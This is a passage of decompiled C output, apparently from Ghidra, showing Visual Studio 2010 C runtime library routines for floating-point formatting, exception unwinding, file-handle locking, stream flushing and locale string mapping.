  *param_2 = 0;
  if (param_3 <= param_4 + 0xb) {
    piVar2 = __errno();
    iVar15 = 0x22;
    goto LAB_0040ed4a;
  }
  local_10 = *(uint *)param_1;
  if ((*(uint *)((int)param_1 + 4) >> 0x14 & 0x7ff) == 0x7ff) {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - 2;
    }
    eVar3 = __cftoe(param_1,param_2 + 2,_SizeInBytes,param_4,0);
    if (eVar3 != 0) {
      *param_2 = 0;
      if (local_1c == '\0') {
        return unaff_EBX;
      }
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      return unaff_EBX;
    }
    if (param_2[2] == '-') {
      *param_2 = 0x2d;
      param_2 = param_2 + 1;
    }
    *param_2 = 0x30;
    param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
    pcVar4 = _strrchr(param_2 + 2,0x65);
    if (pcVar4 != (char *)0x0) {
      *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
      pcVar4[3] = '\0';
    }
    goto LAB_0040f071;
  }
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) != 0) {
    *param_2 = 0x2d;
    param_2 = param_2 + 1;
  }
  *param_2 = 0x30;
  param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
  sVar9 = (-(ushort)(param_5 != 0) & 0xffe0) + 0x27;
  if (((ulonglong)*param_1 & 0x7ff0000000000000) == 0) {
    param_2[2] = 0x30;
    if (*(int *)param_1 == 0 && ((ulonglong)*param_1 & 0xfffff00000000) == 0) {
      local_18 = 0;
    }
    else {
      local_18 = 0x3fe;
    }
  }
  else {
    param_2[2] = 0x31;
  }
  pcVar11 = param_2 + 3;
  pcVar4 = param_2 + 4;
  if (param_4 == 0) {
    *pcVar11 = '\0';
  }
  else {
    *pcVar11 = *(char *)**(undefined4 **)(local_28[0] + 0xbc);
  }
  if ((((ulonglong)*param_1 & 0xfffff00000000) != 0) || (local_c = 0, *(int *)param_1 != 0)) {
    local_10 = 0;
    local_c = 0xf0000;
    do {
      if ((int)param_4 < 1) break;
      uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff);
      uVar1 = (short)uVar13 + 0x30;
      if (0x39 < uVar1) {
        uVar1 = uVar1 + sVar9;
      }
      local_8 = local_8 + -4;
      *pcVar4 = (char)uVar1;
      local_10 = local_10 >> 4 | local_c << 0x1c;
      local_c = local_c >> 4;
      pcVar4 = pcVar4 + 1;
      param_4 = param_4 - 1;
    } while (-1 < (short)local_8);
    if ((-1 < (short)local_8) &&
       (uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff),
       pcVar10 = pcVar4, 8 < (ushort)uVar13)) {
      while( true ) {
        pcVar5 = pcVar10 + -1;
        if ((*pcVar5 != 'f') && (*pcVar5 != 'F')) break;
        *pcVar5 = '0';
        pcVar10 = pcVar5;
      }
      if (pcVar5 == pcVar11) {
        pcVar10[-2] = pcVar10[-2] + '\x01';
      }
      else if (*pcVar5 == '9') {
        *pcVar5 = (char)sVar9 + ':';
      }
      else {
        *pcVar5 = *pcVar5 + '\x01';
      }
    }
  }
  if (0 < (int)param_4) {
    _memset(pcVar4,0x30,param_4);
    pcVar4 = pcVar4 + param_4;
  }
  if (*pcVar11 == '\0') {
    pcVar4 = pcVar11;
  }
  *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
  uVar13 = __aullshr(0x34,*(uint *)((int)param_1 + 4));
  uVar6 = (uint)(uVar13 & 0x7ff);
  uVar7 = uVar6 - local_18;
  uVar6 = (uint)(uVar6 < local_18);
  uVar8 = -uVar6;
  if (uVar6 == 0) {
    pcVar4[1] = '+';
  }
  else {
    pcVar4[1] = '-';
    bVar12 = uVar7 != 0;
    uVar7 = -uVar7;
    uVar8 = -(uVar8 + bVar12);
  }
  pcVar10 = pcVar4 + 2;
  *pcVar10 = '0';
  pcVar11 = pcVar10;
  if (((int)uVar8 < 0) || (((int)uVar8 < 1 && (uVar7 < 1000)))) {
LAB_0040f020:
    if ((-1 < (int)uVar8) && ((0 < (int)uVar8 || (99 < uVar7)))) goto LAB_0040f02b;
  }
  else {
    uVar14 = __alldvrm(uVar7,uVar8,1000,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar10 = (char)uVar14 + '0';
    pcVar11 = pcVar4 + 3;
    uVar8 = 0;
    uVar7 = extraout_ECX;
    if (pcVar11 == pcVar10) goto LAB_0040f020;
LAB_0040f02b:
    uVar14 = __alldvrm(uVar7,uVar8,100,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar8 = 0;
    uVar7 = extraout_ECX_00;
  }
  if ((pcVar11 != pcVar10) || ((-1 < (int)uVar8 && ((0 < (int)uVar8 || (9 < uVar7)))))) {
    uVar14 = __alldvrm(uVar7,uVar8,10,0);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar7 = extraout_ECX_01;
  }
  *pcVar11 = (char)uVar7 + '0';
  pcVar11[1] = '\0';
LAB_0040f071:
  if (local_1c == '\0') {
    return unaff_EBX;
  }
  *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  return unaff_EBX;
}



/* Function: __cftof2_l */

/* Library Function - Single Match
    __cftof2_l
   
   Library: Visual Studio 2010 Release */

undefined4 __thiscall
__cftof2_l(void *this,int param_1,size_t param_2,char param_3,localeinfo_struct *param_4)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  size_t sVar3;
  undefined4 uVar4;
  char *_Str;
  int local_14 [2];
  int local_c;
  char local_8;
  
  iVar1 = in_EAX[1];
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_4);
  if ((this == (void *)0x0) || (param_1 == 0)) {
    piVar2 = __errno();
    uVar4 = 0x16;
    *piVar2 = 0x16;
    FUN_004087f3();
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    if ((param_3 != '\0') && (iVar1 - 1U == param_2)) {
      *(undefined2 *)((uint)(*in_EAX == 0x2d) + (iVar1 - 1U) + (int)this) = 0x30;
    }
    if (*in_EAX == 0x2d) {
      *(undefined1 *)this = 0x2d;
      this = (void *)((int)this + 1);
    }
    if (in_EAX[1] < 1) {
      _Str = (char *)((int)this + 1);
      sVar3 = _strlen((char *)this);
      FID_conflict__memcpy(_Str,this,sVar3 + 1);
      *(char *)this = '0';
    }
    else {
      _Str = (char *)((int)this + in_EAX[1]);
    }
    if (0 < (int)param_2) {
      sVar3 = _strlen(_Str);
      FID_conflict__memcpy(_Str + 1,_Str,sVar3 + 1);
      *_Str = *(char *)**(undefined4 **)(local_14[0] + 0xbc);
      iVar1 = in_EAX[1];
      if (iVar1 < 0) {
        if ((param_3 != '\0') || (SBORROW4(param_2,-iVar1) == (int)(param_2 + iVar1) < 0)) {
          param_2 = -iVar1;
        }
        __shift();
        _memset(_Str + 1,0x30,param_2);
      }
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    uVar4 = 0;
  }
  return uVar4;
}



/* Function: __cftof_l */

/* Library Function - Single Match
    __cftof_l
   
   Library: Visual Studio 2010 Release */

void __cdecl
__cftof_l(double *param_1,undefined1 *param_2,int param_3,size_t param_4,localeinfo_struct *param_5)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if (param_2 == (undefined1 *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004087f3();
  }
  else if (param_3 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004087f3();
  }
  else {
    _SizeInBytes = 0xffffffff;
    if (param_3 != -1) {
      _SizeInBytes = param_3 - (uint)(local_30.sign == 0x2d);
    }
    eVar2 = __fptostr(param_2 + (local_30.sign == 0x2d),_SizeInBytes,local_30.decpt + param_4,
                      &local_30);
    if (eVar2 == 0) {
      __cftof2_l(param_2,param_3,param_4,'\0',param_5);
    }
    else {
      *param_2 = 0;
    }
  }
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: __cftog_l */

/* Library Function - Single Match
    __cftog_l
   
   Library: Visual Studio 2010 Release */

void __cdecl
__cftog_l(double *param_1,undefined1 *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  char *pcVar1;
  int *piVar2;
  errno_t eVar3;
  size_t _SizeInBytes;
  int iVar4;
  char *pcVar5;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined1 *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_004087f3();
  }
  else {
    iVar4 = local_30.decpt + -1;
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (local_30.sign == 0x2d);
    }
    eVar3 = __fptostr(param_2 + (local_30.sign == 0x2d),_SizeInBytes,param_4,&local_30);
    if (eVar3 == 0) {
      local_30.decpt = local_30.decpt + -1;
      if ((local_30.decpt < -4) || ((int)param_4 <= local_30.decpt)) {
        __cftoe2_l(param_3,param_4,param_5,&local_30.sign,'\x01',param_6);
      }
      else {
        pcVar1 = param_2 + (local_30.sign == 0x2d);
        if (iVar4 < local_30.decpt) {
          do {
            pcVar5 = pcVar1;
            pcVar1 = pcVar5 + 1;
          } while (*pcVar5 != '\0');
          pcVar5[-1] = '\0';
        }
        __cftof2_l(param_2,param_3,param_4,'\x01',param_6);
      }
    }
    else {
      *param_2 = 0;
    }
  }
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: __cfltcvt_l */

/* Library Function - Single Match
    __cfltcvt_l
   
   Library: Visual Studio 2010 Release */

errno_t __cdecl
__cfltcvt_l(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps,
           _locale_t plocinfo)

{
  errno_t eVar1;
  errno_t extraout_EAX;
  
  if ((format == 0x65) || (format == 0x45)) {
    eVar1 = __cftoe_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
  }
  else {
    if (format == 0x66) {
      eVar1 = __cftof_l(arg,buffer,sizeInBytes,precision,plocinfo);
      return eVar1;
    }
    if ((format == 0x61) || (format == 0x41)) {
      __cftoa_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
      eVar1 = extraout_EAX;
    }
    else {
      eVar1 = __cftog_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
  }
  return eVar1;
}



/* Function: __cfltcvt */

/* Library Function - Single Match
    __cfltcvt
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release,
   Visual Studio 2012 Release */

errno_t __cdecl
__cfltcvt(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps)

{
  errno_t eVar1;
  
  eVar1 = __cfltcvt_l(arg,buffer,sizeInBytes,format,precision,caps,(_locale_t)0x0);
  return eVar1;
}



/* Function: __setdefaultprecision */

/* Library Function - Single Match
    __setdefaultprecision
   
   Library: Visual Studio 2010 Release */

void __setdefaultprecision(void)

{
  errno_t eVar1;
  
  eVar1 = __controlfp_s((uint *)0x0,0x10000,0x30000);
  if (eVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return;
}



/* Function: __global_unwind2 */

/* Library Function - Single Match
    __global_unwind2
   
   Library: Visual Studio */

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x40f428,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



/* Function: __local_unwind2 */

/* Library Function - Single Match
    __local_unwind2
   
   Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
   Studio 2019 Release */

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  void *local_20;
  undefined1 *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_0040f430;
  local_20 = ExceptionList;
  ExceptionList = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_0040f544();
    }
  }
  ExceptionList = local_20;
  return;
}



/* Function: __NLG_Notify1 */

/* Library Function - Single Match
    __NLG_Notify1
   
   Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
   Studio 2019 Release */

undefined4 __fastcall __NLG_Notify1(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00419ea8 = param_1;
  DAT_00419ea4 = in_EAX;
  DAT_00419eac = unaff_EBP;
  return in_EAX;
}



/* Function: __NLG_Notify */

/* Library Function - Single Match
    __NLG_Notify
   
   Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
   Studio 2019 Release */

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00419ea8 = param_1;
  DAT_00419ea4 = in_EAX;
  DAT_00419eac = unaff_EBP;
  return;
}



/* Function: FUN_0040f544 */

void FUN_0040f544(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



/* Function: __VEC_memzero */

/* Library Function - Single Match
    __VEC_memzero
   
   Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release */

undefined1 (*) [16] __fastcall __VEC_memzero(undefined1 (*param_1) [16],uint param_2)

{
  uint uVar1;
  undefined1 (*pauVar2) [16];
  uint uVar3;
  
  pauVar2 = param_1;
  if (((uint)param_1 & 0xf) != 0) {
    uVar3 = 0x10 - ((uint)param_1 & 0xf);
    param_2 = param_2 - uVar3;
    for (uVar1 = uVar3 & 3; uVar1 != 0; uVar1 = uVar1 - 1) {
      (*pauVar2)[0] = 0;
      pauVar2 = (undefined1 (*) [16])(*pauVar2 + 1);
    }
    for (uVar3 = uVar3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined4 *)*pauVar2 = 0;
      pauVar2 = (undefined1 (*) [16])(*pauVar2 + 4);
    }
  }
  for (uVar1 = param_2 >> 7; uVar1 != 0; uVar1 = uVar1 - 1) {
    *pauVar2 = (undefined1  [16])0x0;
    pauVar2[1] = (undefined1  [16])0x0;
    pauVar2[2] = (undefined1  [16])0x0;
    pauVar2[3] = (undefined1  [16])0x0;
    pauVar2[4] = (undefined1  [16])0x0;
    pauVar2[5] = (undefined1  [16])0x0;
    pauVar2[6] = (undefined1  [16])0x0;
    pauVar2[7] = (undefined1  [16])0x0;
    pauVar2 = pauVar2 + 8;
  }
  if ((param_2 & 0x7f) != 0) {
    for (uVar1 = (param_2 & 0x7f) >> 4; uVar1 != 0; uVar1 = uVar1 - 1) {
      *pauVar2 = (undefined1  [16])0x0;
      pauVar2 = pauVar2 + 1;
    }
    if ((param_2 & 0xf) != 0) {
      for (uVar1 = (param_2 & 0xf) >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {
        *(undefined4 *)*pauVar2 = 0;
        pauVar2 = (undefined1 (*) [16])(*pauVar2 + 4);
      }
      for (uVar1 = param_2 & 3; uVar1 != 0; uVar1 = uVar1 - 1) {
        (*pauVar2)[0] = 0;
        pauVar2 = (undefined1 (*) [16])(*pauVar2 + 1);
      }
    }
  }
  return param_1;
}



/* Function: __free_osfhnd */

/* Library Function - Single Match
    __free_osfhnd
   
   Library: Visual Studio 2010 Release */

int __cdecl __free_osfhnd(int param_1)

{
  int iVar1;
  int *piVar2;
  ulong *puVar3;
  int iVar4;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_0041eaa8)) {
    iVar1 = (&DAT_0041eac0)[param_1 >> 5];
    iVar4 = (param_1 & 0x1fU) * 0x40;
    if (((*(byte *)(iVar1 + 4 + iVar4) & 1) != 0) && (*(int *)(iVar1 + iVar4) != -1)) {
      if (DAT_004191b0 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0040f66c;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0040f66c:
      *(undefined4 *)(iVar4 + (&DAT_0041eac0)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar2 = __errno();
  *piVar2 = 9;
  puVar3 = ___doserrno();
  *puVar3 = 0;
  return -1;
}



/* Function: __get_osfhandle */

/* Library Function - Single Match
    __get_osfhandle
   
   Library: Visual Studio 2010 Release */

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041eaa8)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar3 + 4 + (&DAT_0041eac0)[_FileHandle >> 5]) & 1) != 0) {
        return *(intptr_t *)(iVar3 + (&DAT_0041eac0)[_FileHandle >> 5]);
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004087f3();
  }
  return -1;
}



/* Function: ___lock_fhandle */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    ___lock_fhandle
   
   Library: Visual Studio 2010 Release */

int __cdecl ___lock_fhandle(int _Filehandle)

{
  BOOL BVar1;
  int iVar2;
  uint local_20;
  
  iVar2 = (_Filehandle & 0x1fU) * 0x40 + (&DAT_0041eac0)[_Filehandle >> 5];
  local_20 = 1;
  if (*(int *)(iVar2 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar2 + 8) == 0) {
      BVar1 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(iVar2 + 0xc),4000);
      local_20 = (uint)(BVar1 != 0);
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    }
    FUN_0040f78f();
  }
  if (local_20 != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_0041eac0)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  }
  return local_20;
}



/* Function: FUN_0040f78f */

void FUN_0040f78f(void)

{
  FUN_0040c0a7(10);
  return;
}



/* Function: __unlock_fhandle */

/* Library Function - Single Match
    __unlock_fhandle
   
   Library: Visual Studio 2010 Release */

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_0041eac0)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  return;
}



/* Function: __putwch_nolock */

/* Library Function - Single Match
    __putwch_nolock
   
   Library: Visual Studio 2010 Release */

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  BOOL BVar1;
  DWORD local_8;
  
  if (DAT_00419f30 == (HANDLE)0xfffffffe) {
    ___initconout();
  }
  if (DAT_00419f30 != (HANDLE)0xffffffff) {
    BVar1 = WriteConsoleW(DAT_00419f30,&_WCh,1,&local_8,(LPVOID)0x0);
    if (BVar1 != 0) {
      return _WCh;
    }
  }
  return 0xffff;
}



/* Function: __alloca_probe */

/* WARNING: This is an inlined function */
/* Library Function - Single Match
    __chkstk
   
   Library: Visual Studio 2010 Release */

void __alloca_probe(void)

{
  undefined1 *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined1 auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



/* Function: __fcloseall */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    __fcloseall
   
   Library: Visual Studio 2010 Release */

int __cdecl __fcloseall(void)

{
  FILE *_File;
  int iVar1;
  int iVar2;
  int local_20;
  
  local_20 = 0;
  __lock(1);
  for (iVar2 = 3; iVar2 < DAT_0041eaa0; iVar2 = iVar2 + 1) {
    if (*(int *)(DAT_0041da90 + iVar2 * 4) != 0) {
      _File = *(FILE **)(DAT_0041da90 + iVar2 * 4);
      if ((_File->_flag & 0x83) != 0) {
        iVar1 = _fclose(_File);
        if (iVar1 != -1) {
          local_20 = local_20 + 1;
        }
      }
      if (0x13 < iVar2) {
        DeleteCriticalSection((LPCRITICAL_SECTION)(*(int *)(DAT_0041da90 + iVar2 * 4) + 0x20));
        _free(*(void **)(DAT_0041da90 + iVar2 * 4));
        *(undefined4 *)(DAT_0041da90 + iVar2 * 4) = 0;
      }
    }
  }
  FUN_0040f8ce();
  return local_20;
}



/* Function: FUN_0040f8ce */

void FUN_0040f8ce(void)

{
  FUN_0040c0a7(1);
  return;
}



/* Function: __flush */

/* Library Function - Single Match
    __flush
   
   Library: Visual Studio 2010 Release */

int __cdecl __flush(FILE *_File)

{
  int _FileHandle;
  uint uVar1;
  int iVar2;
  uint uVar3;
  char *_Buf;
  
  iVar2 = 0;
  if ((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) {
    _Buf = _File->_base;
    uVar3 = (int)_File->_ptr - (int)_Buf;
    if (0 < (int)uVar3) {
      uVar1 = uVar3;
      _FileHandle = __fileno(_File);
      uVar1 = __write(_FileHandle,_Buf,uVar1);
      if (uVar1 == uVar3) {
        if ((char)_File->_flag < '\0') {
          _File->_flag = _File->_flag & 0xfffffffd;
        }
      }
      else {
        _File->_flag = _File->_flag | 0x20;
        iVar2 = -1;
      }
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar2;
}



/* Function: __fflush_nolock */

/* Library Function - Single Match
    __fflush_nolock
   
   Library: Visual Studio 2010 Release */

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = flsall(0);
  }
  else {
    iVar1 = __flush(_File);
    if (iVar1 == 0) {
      if ((_File->_flag & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = __fileno(_File);
        iVar1 = __commit(iVar1);
        iVar1 = -(uint)(iVar1 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



/* Function: flsall */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    _flsall
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

int __cdecl flsall(int param_1)

{
  int *piVar1;
  void *_File;
  FILE *_File_00;
  int iVar2;
  int _Index;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_0041eaa0; _Index = _Index + 1) {
    piVar1 = (int *)(DAT_0041da90 + _Index * 4);
    if ((*piVar1 != 0) && (_File = (void *)*piVar1, (*(byte *)((int)_File + 0xc) & 0x83) != 0)) {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_0041da90 + _Index * 4);
      if ((_File_00->_flag & 0x83U) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else if ((param_1 == 0) && ((_File_00->_flag & 2U) != 0)) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_0040fa29();
    }
  }
  FUN_0040fa58();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



/* Function: FUN_0040fa29 */

void FUN_0040fa29(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_0041da90 + unaff_ESI * 4));
  return;
}



/* Function: FUN_0040fa58 */

void FUN_0040fa58(void)

{
  FUN_0040c0a7(1);
  return;
}



/* Function: __flushall */

/* Library Function - Single Match
    __flushall
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release */

int __cdecl __flushall(void)

{
  int iVar1;
  
  iVar1 = flsall(1);
  return iVar1;
}



/* Function: __crtLCMapStringA_stat */

/* WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe */
/* Library Function - Single Match
    int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
   const *,int,char *,int,int,int)
   
   Library: Visual Studio 2010 Release */

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint _Size;
  bool bVar1;
  uint uVar2;
  char *pcVar3;
  int iVar4;
  uint cchWideChar;
  uint uVar5;
  LPCWSTR pWVar6;
  int iVar7;
  LPCWSTR local_10;
  
  uVar2 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  pcVar3 = param_4;
  iVar7 = param_5;
  if (0 < param_5) {
    do {
      iVar7 = iVar7 + -1;
      if (*pcVar3 == '\0') goto LAB_0040fa9a;
      pcVar3 = pcVar3 + 1;
    } while (iVar7 != 0);
    iVar7 = -1;
LAB_0040fa9a:
    iVar7 = param_5 - iVar7;
    iVar4 = iVar7 + -1;
    bVar1 = iVar4 < param_5;
    param_5 = iVar4;
    if (bVar1) {
      param_5 = iVar7;
    }
  }
  if (param_8 == 0) {
    param_8 = param_1->locinfo->lc_codepage;
  }
  cchWideChar = MultiByteToWideChar(param_8,(uint)(param_9 != 0) * 8 + 1,param_4,param_5,(LPWSTR)0x0
                                    ,0);
  if (cchWideChar == 0) goto LAB_0040fc3f;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_10 = (LPCWSTR)0x0;
  }
  else {
    uVar5 = cchWideChar * 2 + 8;
    if (uVar5 < 0x401) {
      pWVar6 = (LPCWSTR)&stack0xffffffe0;
      local_10 = (LPCWSTR)&stack0xffffffe0;
      if (&stack0x00000000 != (undefined1 *)0x20) {
LAB_0040fb2a:
        local_10 = pWVar6 + 4;
      }
    }
    else {
      pWVar6 = (LPCWSTR)_malloc(uVar5);
      local_10 = pWVar6;
      if (pWVar6 != (LPCWSTR)0x0) {
        pWVar6[0] = L'\xdddd';
        pWVar6[1] = L'\0';
        goto LAB_0040fb2a;
      }
    }
  }
  if (local_10 == (LPCWSTR)0x0) goto LAB_0040fc3f;
  iVar7 = MultiByteToWideChar(param_8,1,param_4,param_5,local_10,cchWideChar);
  if ((iVar7 != 0) &&
     (uVar5 = LCMapStringW(param_2,param_3,local_10,cchWideChar,(LPWSTR)0x0,0), uVar5 != 0)) {
    if ((param_3 & 0x400) == 0) {
      if (((int)uVar5 < 1) || (0xffffffe0 / uVar5 < 2)) {
        pWVar6 = (LPCWSTR)0x0;
      }
      else {
        _Size = uVar5 * 2 + 8;
        if (_Size < 0x401) {
          if (&stack0x00000000 == (undefined1 *)0x20) goto LAB_0040fc33;
          pWVar6 = (LPCWSTR)&stack0xffffffe8;
        }
        else {
          pWVar6 = (LPCWSTR)_malloc(_Size);
          if (pWVar6 != (LPCWSTR)0x0) {
            pWVar6[0] = L'\xdddd';
            pWVar6[1] = L'\0';
            pWVar6 = pWVar6 + 4;
          }
        }
      }
      if (pWVar6 != (LPCWSTR)0x0) {
        iVar7 = LCMapStringW(param_2,param_3,local_10,cchWideChar,pWVar6,uVar5);
        if (iVar7 != 0) {
          if (param_7 == 0) {
            param_7 = 0;
            param_6 = (LPSTR)0x0;
          }
          WideCharToMultiByte(param_8,0,pWVar6,uVar5,param_6,param_7,(LPCSTR)0x0,(LPBOOL)0x0);
        }
        __freea(pWVar6);
      }
    }
    else if ((param_7 != 0) && ((int)uVar5 <= param_7)) {
      LCMapStringW(param_2,param_3,local_10,cchWideChar,(LPWSTR)param_6,param_7);
    }
  }
LAB_0040fc33:
  __freea(local_10);
LAB_0040fc3f:
  iVar7 = __security_check_cookie(uVar2 ^ (uint)&stack0xfffffffc);
  return iVar7;
}



/* Function: ___crtLCMapStringA */

/* Library Function - Single Match
    ___crtLCMapStringA
   
   Library: Visual Studio 2010 Release */

int __cdecl
